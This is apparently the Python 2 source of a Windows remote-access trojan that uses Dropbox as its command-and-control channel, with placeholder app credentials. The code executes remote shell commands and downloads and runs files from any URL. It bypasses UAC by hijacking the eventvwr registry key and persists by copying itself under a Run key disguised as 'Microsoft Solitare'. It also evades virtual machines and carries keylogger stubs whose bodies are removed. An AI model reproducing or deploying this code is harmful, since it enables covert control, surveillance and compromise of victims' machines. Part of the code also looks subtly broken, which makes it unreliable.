# -*- coding: utf-8 -*-
from _winreg import *
from win32file import CopyFile
import requests
import os
import dropbox
import time
import threading
import cmd
import platform
import psutil
import json
import base64
import ctypes
import subprocess
import uuid
import sys

# ============================================================
# === Dropbox OAuth2 Configuration - Auto Refresh Token ===
# ============================================================

APP_KEY = "YOUR_APP_KEY"           # Điền App key từ Dropbox App Console
APP_SECRET = "YOUR_APP_SECRET"     # Điền App secret
REFRESH_TOKEN = "YOUR_REFRESH_TOKEN"  # Điền refresh token bạn đã tạo

def get_access_token():
    """
    Lấy access_token mới từ Dropbox bằng refresh_token.
    """
    url = "https://api.dropboxapi.com/oauth2/token"
    data = {
        "grant_type": "refresh_token",
        "refresh_token": REFRESH_TOKEN,
    }
    auth = (APP_KEY, APP_SECRET)
    try:
        response = requests.post(url, data=data, auth=auth)
        if response.status_code == 200:
            token = response.json()["access_token"]
            return token
        else:
            print "[!] Failed to refresh token:", response.text
            return None
    except Exception, e:
        print "[!] Exception while refreshing token:", e
        return None

# Lấy access_token ban đầu
access_token = get_access_token()
if not access_token:
    raise SystemExit("[!] Could not obtain Dropbox access token.")
dbx = dropbox.Dropbox(access_token)

# Hàm tự động làm mới token mỗi 4 tiếng
def refresh_dropbox_token_periodically(interval=14400):  # 4h = 14400s
    while True:
        time.sleep(interval)
        new_token = get_access_token()
        if new_token:
            global dbx
            dbx = dropbox.Dropbox(new_token)
            print "[+] Dropbox token refreshed."


# ============================================================
# === Agent logic (không thay đổi nhiều) ===
# ============================================================

agentName = ""
tasks = {}
keyloggerStarted = False
completedTasks = []

def executeBackground(command):
    subprocess.Popen([command.split()])
    return True

def ExecuteShellCommand(command):
    data = ""
    try:
        p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for output in iter(p.stdout.readline, b''):
            data += output
    except Exception, err:
        data = str(err)
    return data

def exec_keylog_start():
    global keyloggerStarted
    keyloggerStarted = True
    data = "[+] Keylogger Started Successfully [+]"
    # CODE REMOVED
    return base64.b64encode(str(data))

def exec_keylog_stop():
    global keyloggerStarted
    keyloggerStarted = False
    data = "[+] Keylogger Stopped Successfully [+]"
    # CODE REMOVED
    return base64.b64encode(str(data))

def exec_bypassuac():
    if ctypes.windll.shell32.IsUserAnAdmin():
        data = "[+] Agent is running with Administrative Privileges [+]"
    else:
        keyVal = r'Software\Classes\mscfile\shell\open\command'
        try:
            key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        except:
            key = CreateKey(HKEY_CURRENT_USER, keyVal)
        SetValueEx(key, None, 0, REG_SZ, sys.executable)
        CloseKey(key)
        os.system("eventvwr")
        data = "[+] Task bypassuac Executed Successfully [+]"
    return base64.b64encode(str(data))

def exec_cmd(cmd):
    data = ExecuteShellCommand(cmd.split())
    return base64.b64encode(str(data))

def exec_persist():
    data = ""
    filedrop = r'%s\Saved Games\%s' % (os.path.expandvars("%userprofile%"), 'sol.exe')
    currentExecutable = sys.executable
    try:
        CopyFile(currentExecutable, filedrop, 0)
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key, "Microsoft Solitare", 0, REG_SZ, filedrop)
        CloseKey(key)
        data = "[+] Persistence Completed [+]"
    except Exception:
        data = "[-] Error while creating persistence [-]"
    return base64.b64encode(str(data))

def exec_downloadexecute(url):
    try:
        r = requests.get(url)
        filename = url.split('/')[-1]
        if r.status_code == 200:
            f = open(filename, 'wb')
            f.write(r.content)
            f.close()
            executeBackground(filename)
            data = "[+] Task Completed Successfully [+]"
        else:
            data = "[-] Error [-]"
    except Exception, err:
        data = str(err)
    return base64.b64encode(str(data))

def doTask(command, task):
    mode = (dropbox.files.WriteMode.overwrite)
    output = {}
    path = '/%s/output' % agentName
    try:
        _, res = dbx.files_download(path)
    except Exception:
        dbx.files_upload(json.dumps(output), path, mode)
        _, res = dbx.files_download(path)

    output = json.loads(res.content.replace('\n', ''))

    if command.startswith('{SHELL}'):
        cmd = command.split('{SHELL}')[1]
        output[task] = {"OUTPUT": exec_cmd(cmd)}

    if command.startswith('{DOWNLOAD}'):
        url = command.split('{DOWNLOAD}')[1]
        output[task] = {"OUTPUT": exec_downloadexecute(url)}

    elif command == "persist":
        output[task] = {"OUTPUT": exec_persist()}

    elif command == "keylog_start":
        output[task] = {"OUTPUT": exec_keylog_start()}

    elif command == "keylog_stop":
        output[task] = {"OUTPUT": exec_keylog_stop()}

    elif command == "bypassuac":
        output[task] = {"OUTPUT": exec_bypassuac()}

    try:
        dbx.files_upload(json.dumps(output), path, mode)
        completedTasks.append(task)
    except Exception:
        time.sleep(30)
        pass

class agentNotifier(object):
    def __init__(self, interval=20):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = False
        thread.start()

    def run(self):
        while True:
            notify()
            time.sleep(self.interval)

class taskChecker(object):
    def __init__(self, interval=5):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = False
        thread.start()

    def run(self):
        while True:
            checkTasks()
            time.sleep(self.interval)

def checkTasks():
    global tasks
    path = '/%s/tasks' % agentName
    for file in dbx.files_list_folder('/%s/' % agentName).entries:
        if file.name == 'tasks':
            _, res = dbx.files_download(path)
            if res.content != "":
                tasks = json.loads(res.content.replace('\n', ''))
                for task, taskContent in tasks.iteritems():
                    if str(taskContent["STATUS"]) == "Completed":
                        deleteOutputKey(task)
                    if str(taskContent["STATUS"]) == "Waiting" and task not in completedTasks:
                        doTask(str(taskContent["COMMAND"]), task)

def firstTime():
    return True

def dropboxFileExists(path, file):
    for fileName in dbx.files_list_folder(path).entries:
        if fileName.name == file:
            return True
    return False

def deleteOutputKey(taskname):
    path = '/%s/output' % agentName
    mode = (dropbox.files.WriteMode.overwrite)
    try:
        if dropboxFileExists('/%s/' % agentName, 'output'):
            _, res = dbx.files_download(path)
            if res.content != "":
                outputData = json.loads(res.content.replace('\n', ''))
                del outputData[taskname]
            else:
                outputData = {}
            dbx.files_upload(json.dumps(outputData), path, mode)
    except Exception:
        pass

def notify():
    data = str(time.time())
    path = '/%s/lasttime' % agentName
    mode = (dropbox.files.WriteMode.add)
    for file in dbx.files_list_folder('/%s/' % agentName).entries:
        if file.name == 'lasttime':
            mode = (dropbox.files.WriteMode.overwrite)
            break
    try:
        dbx.files_upload(data, path, mode)
    except Exception:
        time.sleep(30)

def antivm():
    if psutil.cpu_count() > 2 and platform.release() != 'XP' and firstTime():
        try:
            setAgentName()
            dbx.files_create_folder('/%s' % agentName)
        except Exception, e:
            print e
            pass
    else:
        exit(0)

def setAgentName():
    global agentName
    if ctypes.windll.shell32.IsUserAnAdmin():
        agentName = "%s-%s%s" % (platform.node(), str(uuid.getnode()), "SYS")
    else:
        agentName = "%s-%s" % (platform.node(), str(uuid.getnode()))

def main():
    antivm()
    threading.Thread(target=refresh_dropbox_token_periodically, daemon=True).start()
    notifier = agentNotifier()
    taskchecker = taskChecker()

if __name__ == "__main__":
    main()
